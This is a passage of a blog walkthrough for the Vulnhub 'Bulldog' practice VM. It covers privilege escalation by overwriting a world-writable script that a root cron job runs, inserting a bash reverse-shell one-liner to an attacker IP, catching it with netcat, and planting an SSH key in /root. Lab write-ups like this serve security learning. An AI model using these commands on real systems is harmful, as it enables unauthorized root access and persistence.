<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bulldogadmin</span><span class="o">/</span><span class="p">.</span><span class="n">hiddenadmindirectory</span><span class="o">/</span><span class="n">customPermissionApp</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">customPermissionApp</span><span class="w"></span>
</code></pre></div>

<p>Then it's reverse, but another lead was found during the reconnaissance for privilege escalation:</p>
<h3>Cron</h3>
<p>By looking at the cron files we also see that there is a runAV task:</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ahlR</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">722</span><span class="w"> </span><span class="n">Apr</span><span class="w">  </span><span class="mi">5</span><span class="w">  </span><span class="mi">2016</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w"></span>

<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="nl">d</span><span class="p">:</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="n">K</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">05</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">94</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mf">4.0</span><span class="n">K</span><span class="w"> </span><span class="n">Nov</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="mi">06</span><span class="err">:</span><span class="mi">38</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">589</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">16</span><span class="w">  </span><span class="mi">2014</span><span class="w"> </span><span class="n">mdadm</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">102</span><span class="w"> </span><span class="n">Apr</span><span class="w">  </span><span class="mi">5</span><span class="w">  </span><span class="mi">2016</span><span class="w"> </span><span class="p">.</span><span class="n">placeholder</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">191</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">17</span><span class="err">:</span><span class="mi">38</span><span class="w"> </span><span class="n">popularity</span><span class="o">-</span><span class="n">contest</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">54</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">05</span><span class="w"> </span><span class="n">runAV</span><span class="w"></span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
</code></pre></div>

<p>By digging in we found that:</p>
<p>it run a script with root right every minute</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">runAV</span><span class="w"></span>
<span class="o">*/</span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
</code></pre></div>

<p>the script is world writable:</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">157</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">12</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
</code></pre></div>

<p>that the script is just a place holder:</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
<span class="err">#!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span><span class="w"> </span><span class="n">python</span><span class="w"></span>

<span class="err">#</span><span class="w"> </span><span class="n">Just</span><span class="w"> </span><span class="n">wanted</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">placeholder</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="n">really</span><span class="w"> </span><span class="n">quick</span><span class="p">.</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">full</span><span class="w"> </span><span class="n">AV</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vendor</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="n">making</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"></span>
<span class="err">#</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Alan</span><span class="w"></span>
</code></pre></div>

<p>We can just get a reverse root shell by modifying the file:</p>
<div class="highlight"><pre><span></span><code><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
<span class="err">#!</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"></span>
<span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.0.2.15</span><span class="o">/</span><span class="mi">4444</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="w"></span>
</code></pre></div>

<p>And listen client side:</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">netcat</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">4444</span><span class="w"></span>
<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="p">(</span><span class="mi">2145</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span><span class="w"></span>
<span class="nl">bash</span><span class="p">:</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span><span class="w"></span>
<span class="n">root</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"></span>
<span class="n">id</span><span class="w"></span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"></span>
<span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="w"></span>
<span class="n">congrats</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">congrats</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">Congratulations</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">completing</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">VM</span><span class="w"> </span><span class="err">:</span><span class="n">D</span><span class="w"> </span><span class="n">That</span><span class="w"> </span><span class="n">wasn</span><span class="s1">&#39;t so bad was it?</span>
<span class="s1">Let me know what you thought on twitter, I&#39;</span><span class="n">m</span><span class="w"> </span><span class="nv">@frichette_n</span><span class="w"></span>
<span class="k">As</span><span class="w"> </span><span class="n">far</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">ways</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="w"> </span><span class="n">Can</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">one</span><span class="vm">?</span><span class="w"></span>
<span class="n">Perhaps</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sequel</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">challenging</span><span class="p">.</span><span class="w"> </span><span class="n">Until</span><span class="w"> </span><span class="k">next</span><span class="w"> </span><span class="nc">time</span><span class="p">,</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">hope</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">enjoyed</span><span class="err">!</span><span class="w"></span>
</code></pre></div>

<p>Yeah the other one include reverse engineering which is not my thing :)</p>
<p>In order to have a complete interactive shell we may just copy our ssh key on the root folder:</p>
<div class="highlight"><pre><span></span><code>cp /home/django.ssh /root -r
</code></pre></div>

<p>And connect with ssh:</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="mf">10.0.2.4</span><span class="w"> </span><span class="o">-</span><span class="n">lroot</span><span class="w"> </span><span class="o">-</span><span class="n">p23</span><span class="w"></span>
<span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">16.04.3</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">4.4.0</span><span class="o">-</span><span class="mi">87</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span><span class="w"></span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
<span class="n">root</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"></span>
</code></pre></div>

<p>DONE.</p>
<p>Thanks to <a href="https://twitter.com/@frichette_n">@frichette_n</a> for the machine and thanks to <a href="https://twitter.com/VulnHub">@vulnub</a>.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/vulnhub.html">vulnhub</a>
      <a href="../../tag/hash.html">hash</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2017/08/breaking-some-homemade-crypto.html" title="Breaking some homemade crypto">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2017/11/vulnhub-born2root.html" title="Vulnhub, born2root">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>